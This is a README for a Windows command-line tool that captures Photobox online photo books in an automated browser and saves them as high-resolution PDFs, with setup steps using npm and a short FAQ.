# 📸 Photobox-Book-To-PDF - Create high resolution PDF photo books

[![](https://img.shields.io/badge/Download-Photobox_Book_To_PDF-blue.svg)](https://github.com/Gabrielebay291/Photobox-Book-To-PDF)

This tool converts your Photobox online photo books into clean, high-resolution PDF files. It captures every page at full resolution and stitches them into a single document. You keep your memories in a permanent digital format that matches the quality of your original project.

## 📋 What this tool does

- Rescues your photo book projects into a portable document format.
- Captures pages at original source resolution for clear output.
- Maintains the layout and design of your original project.
- Works as a standalone offline archive for your prints.

## 💻 System requirements

- Windows 10 or Windows 11.
- An active internet connection to load your photo book.
- At least 500 MB of free disk space for processing.
- A modern web browser installed on your computer.

## ⚙️ Running the application

Once you have prepared the software and Node.js, you can start the process of creating your PDF.

1. Open the folder where you extracted the tool files.
2. Click inside the folder. In the top address bar of the File Explorer window, type "cmd" and press Enter. A black window will appear.
3. Type `npm install` into this black window and press Enter. Wait a few moments while the computer sets up the necessary components.
4. Type `npm start` and press Enter to launch the tool.
5. The program will prompt you to enter the URL of your Photobox project. Copy the link to your photo book from your browser, paste it into the window, and press Enter.
6. The window will display the progress of the capture. It will open a temporary browser and scroll through your pages. Do not close this window until the process finishes.
7. Once the tool indicates the task is complete, look in the folder for a new file labeled as your finished PDF.

## 🔍 Frequently asked questions

**Will this app ruin my photo book?**
No. This tool only views the public preview of your book. It does not modify your original Photobox account or your saved projects.

**How long does it take for a book to process?**
Processing speed depends on the length of your book and your internet connection. A standard book typically takes five to ten minutes.

**Why does the browser window pop up?**
The tool uses a process called automated browsing. It needs to "see" your photos to record them in high quality. The browser window confirms that the tool is capturing exactly what you see on your screen.

**Can I stop the process mid-way?**
Yes. If you close the black window, the process stops. However, the resulting PDF will only contain the pages saved up to that point. It is best to let the process run to completion.

**What do I do if I get an error?**
Most errors occur due to network interruptions. Ensure your internet connection remains stable. If the screen freezes, close the black window and restart the tool.
